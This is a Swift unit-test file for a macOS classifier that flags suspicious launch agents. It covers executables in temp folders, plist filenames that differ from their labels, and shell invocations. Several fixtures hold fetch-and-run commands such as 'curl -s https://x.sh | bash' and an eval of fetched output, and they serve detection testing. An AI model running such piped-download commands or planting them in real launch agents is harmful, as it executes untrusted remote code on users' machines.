import Foundation
import Testing
@testable import GargantuaCore

// Deterministic suspicion heuristics (rule 3.25): suspiciousExecutablePath,
// labelFilenameMismatch, shellInvocation. Split from
// BackgroundItemSafetyClassifierTests to keep that suite's type body under
// the 300-line SwiftLint limit. Negatives here mirror real plist shapes
// observed on-machine — do not weaken them.
@Suite("BackgroundItemSafetyClassifier — suspicious signals")
struct SafetyClassifierSuspiciousTests {

    private let classifier = BackgroundItemSafetyClassifier()

    // MARK: - suspiciousExecutablePath

    @Test("Temp-dir executable forces review even on an otherwise rule-4 safe shape")
    func tempExecutableForcesReviewOverKnownVendorSafePath() {
        let identity = makeIdentity(vendor: .thirdPartyKnown, bundlePath: "/Applications/Agent.app")
        let input = BackgroundItemClassifierInput(
            label: "com.agent.helper",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.agent.helper.plist",
            executablePath: "/tmp/agent",
            identity: identity,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
    }

    @Test("Downloads executable is flagged suspicious")
    func downloadsExecutableIsFlagged() {
        let input = BackgroundItemClassifierInput(
            label: "com.example.tool",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.tool.plist",
            executablePath: "/Users/x/Downloads/tool",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
    }

    @Test("Ordinary /usr/local/bin executable is not flagged suspicious")
    func usrLocalBinExecutableIsNotFlagged() {
        let input = BackgroundItemClassifierInput(
            label: "com.example.tool",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.tool.plist",
            executablePath: "/usr/local/bin/tool",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(!result.reasons.contains(.suspiciousExecutablePath))
    }

    // MARK: - labelFilenameMismatch

    @Test("Handy-shaped plist filename matching label is not flagged")
    func handyShapedFilenameMatchIsNotFlagged() {
        let input = BackgroundItemClassifierInput(
            label: "Handy",
            source: .userLaunchAgent,
            plistPath: "/Users/x/Library/LaunchAgents/Handy.plist",
            executablePath: "/Applications/Handy.app/Contents/MacOS/Handy",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(!result.reasons.contains(.labelFilenameMismatch))
    }

    @Test("Filename stem that disagrees with the plist Label is flagged and forces review")
    func filenameLabelMismatchIsFlaggedAndReview() {
        let input = BackgroundItemClassifierInput(
            label: "com.acme.updater",
            source: .userLaunchAgent,
            plistPath: "/Users/x/Library/LaunchAgents/com.acme.helper.plist",
            executablePath: "/usr/local/bin/helper",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.labelFilenameMismatch))
    }

    @Test("Filename stem vs. Label comparison is case-insensitive")
    func filenameLabelComparisonIsCaseInsensitive() {
        let input = BackgroundItemClassifierInput(
            label: "com.acme.helper",
            source: .userLaunchAgent,
            plistPath: "/Users/x/Library/LaunchAgents/Com.Acme.Helper.plist",
            executablePath: "/usr/local/bin/helper",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(!result.reasons.contains(.labelFilenameMismatch))
    }

    // MARK: - shellInvocation

    @Test("bash -l script invocation without -c is not flagged (real com.jason.memex.sync shape)")
    func bashLoginScriptWithoutDashCIsNotFlagged() {
        let plist = LaunchdPlist(
            label: "com.jason.memex.sync",
            programArguments: ["/bin/bash", "-l", "/Users/x/scripts/sync.sh"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.jason.memex.sync",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.jason.memex.sync.plist",
            executablePath: "/bin/bash",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        let result = classifier.classify(input)
        #expect(!result.reasons.contains(.shellInvocation))
    }

    @Test("Single-argument script invocation with no shell interpreter is not flagged")
    func singleArgumentScriptIsNotFlagged() {
        let plist = LaunchdPlist(
            label: "com.jason.tmexclude",
            programArguments: ["/Users/x/bin/tm-exclude.sh"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.jason.tmexclude",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.jason.tmexclude.plist",
            executablePath: "/Users/x/bin/tm-exclude.sh",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        let result = classifier.classify(input)
        #expect(!result.reasons.contains(.shellInvocation))
    }

    @Test("sh -c piping curl through bash is flagged and forces review")
    func shPipedCurlThroughBashIsFlaggedAndReview() {
        let plist = LaunchdPlist(
            label: "com.example.installer",
            programArguments: ["/bin/sh", "-c", "curl -s https://x.sh | bash"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.example.installer",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.installer.plist",
            executablePath: "/bin/sh",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.shellInvocation))
    }

    @Test("zsh -c eval invocation is flagged")
    func zshEvalInvocationIsFlagged() {
        let plist = LaunchdPlist(
            label: "com.example.fetcher",
            programArguments: ["/bin/zsh", "-c", "eval $(fetch-cmd)"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.example.fetcher",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.fetcher.plist",
            executablePath: "/bin/zsh",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        let result = classifier.classify(input)
        #expect(result.reasons.contains(.shellInvocation))
    }

    @Test("Combined short-flag cluster (bash -lc) is treated as -c")
    func combinedFlagClusterIsFlagged() {
        let plist = LaunchdPlist(
            label: "com.example.lc",
            programArguments: ["/bin/bash", "-lc", "curl -fsSL https://x.sh | sh"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.example.lc",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.lc.plist",
            executablePath: "/bin/bash",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.shellInvocation))
    }

    @Test("Benign words containing pattern substrings are not flagged (retrieval ≠ eval)")
    func benignSubstringsAreNotFlagged() {
        let plist = LaunchdPlist(
            label: "com.example.notes",
            programArguments: ["/bin/sh", "-c", "process --retrieval mode --curly-braces"]
        )
        let input = BackgroundItemClassifierInput(
            label: "com.example.notes",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.notes.plist",
            executablePath: "/bin/sh",
            identity: nil,
            executableExists: true,
            plist: plist
        )
        #expect(!classifier.classify(input).reasons.contains(.shellInvocation))
    }

    @Test("Filename mismatch is scoped to user agents — /Library vendor quirks don't flag")
    func mismatchScopedToUserAgents() {
        let systemInput = BackgroundItemClassifierInput(
            label: "com.vendor.updater.daemon",
            source: .systemLaunchAgent,
            plistPath: "/Library/LaunchAgents/com.vendor.updater.plist",
            executablePath: "/Library/Vendor/updater",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        #expect(!classifier.classify(systemInput).reasons.contains(.labelFilenameMismatch))
    }

    @Test("Suspicious early return carries the parentAppMissing evidence chip")
    func suspiciousCarriesParentAppMissingChip() {
        let input = BackgroundItemClassifierInput(
            label: "com.example.gone",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.gone.plist",
            executablePath: "/tmp/gone-tool",
            identity: nil,
            executableExists: true,
            parentAppInstalled: false,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
        #expect(result.reasons.contains(.parentAppMissing))
    }

    // MARK: - Interaction with earlier rules

    @Test("Missing executable in a temp dir stays safe via rule 3, but the suspicious chip survives")
    func missingTempExecutableStaysSafeButKeepsChip() {
        let input = BackgroundItemClassifierInput(
            label: "com.example.ghost",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.ghost.plist",
            executablePath: "/tmp/ghost",
            identity: nil,
            executableExists: false,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .safe)
        #expect(result.reasons.contains(.orphaned))
        #expect(result.reasons.contains(.suspiciousExecutablePath))
    }

    @Test("com.apple. label stays protected, but the suspicious chip survives")
    func appleLabelStaysProtectedButKeepsChip() {
        let input = BackgroundItemClassifierInput(
            label: "com.apple.ghost",
            source: .launchDaemon,
            plistPath: "/tmp/com.apple.ghost.plist",
            executablePath: "/tmp/ghost",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .protected_)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
    }

    // MARK: - isSuspicious

    @Test("isSuspicious is true only for the three deterministic signals")
    func isSuspiciousMarksOnlyTheThreeNewReasons() {
        #expect(BackgroundItemReason.suspiciousExecutablePath.isSuspicious)
        #expect(BackgroundItemReason.labelFilenameMismatch.isSuspicious)
        #expect(BackgroundItemReason.shellInvocation.isSuspicious)
        #expect(!BackgroundItemReason.orphaned.isSuspicious)
        #expect(!BackgroundItemReason.unsigned.isSuspicious)
    }

    // MARK: - Helpers

    private func makeIdentity(
        vendor: VendorClassification,
        bundlePath: String? = "/Applications/Stub.app",
        sensitiveCategories: Set<SensitiveVendorCategory> = []
    ) -> BinaryIdentity {
        BinaryIdentity(
            binaryPath: "/tmp/stub",
            bundlePath: bundlePath,
            bundleIdentifier: "com.stub.app",
            bundleName: "Stub",
            vendor: vendor,
            vendorDisplayName: vendor == .thirdPartyKnown ? "Stub Vendor" : nil,
            sensitiveCategories: sensitiveCategories
        )
    }
}

// Pure static-helper coverage for the suspicion signals, split out to keep
// each type body under the 300-line SwiftLint limit.
@Suite("Suspicious signal helpers")
struct SuspiciousSignalHelperTests {

    @Test("Uppercase temp paths are caught on the case-insensitive filesystem")
    func uppercaseTempPathIsFlagged() {
        let input = BackgroundItemClassifierInput(
            label: "com.example.shout",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.shout.plist",
            executablePath: "/TMP/evil",
            identity: nil,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
    }

    @Test("Suspicious early return still carries the unsigned evidence chip")
    func suspiciousCarriesUnsignedChip() {
        let identity = BinaryIdentity(binaryPath: "/tmp/tool", vendor: .unsigned)
        let input = BackgroundItemClassifierInput(
            label: "com.example.tool",
            source: .userLaunchAgent,
            plistPath: "/tmp/com.example.tool.plist",
            executablePath: "/tmp/tool",
            identity: identity,
            executableExists: true,
            plist: nil
        )
        let result = classifier.classify(input)
        #expect(result.safety == .review)
        #expect(result.reasons.contains(.suspiciousExecutablePath))
        #expect(result.reasons.contains(.unsigned))
    }

    private let classifier = BackgroundItemSafetyClassifier()

    @Test("env-wrapped shell invocations are unwrapped and flagged")
    func envWrappedShellIsFlagged() {
        let args = ["/usr/bin/env", "-i", "PATH=/usr/bin", "bash", "-c", "curl https://x.sh | sh"]
        #expect(BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
    }

    @Test("A -c after the script path belongs to the script, not the shell")
    func dashCAfterScriptIsNotFlagged() {
        let args = ["/bin/bash", "task.sh", "-c", "curl https://x.sh | sh"]
        #expect(!BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
    }

    @Test("Command substitution still yields a curl token")
    func commandSubstitutionIsFlagged() {
        let args = ["/bin/sh", "-c", "OUT=$(curl https://x.sh); run $OUT"]
        #expect(BackgroundItemSafetyClassifier.isPipedShellInvocation(args))
    }

    @Test("Dot-segment paths are standardized before the temp-root checks")
    func dotSegmentPathsAreNormalized() {
        #expect(BackgroundItemSafetyClassifier.isSuspiciousExecutableLocation("/private/var/../tmp/evil"))
        #expect(!BackgroundItemSafetyClassifier.isSuspiciousExecutableLocation("/tmp/../Applications/Tool.app/x"))
    }
}
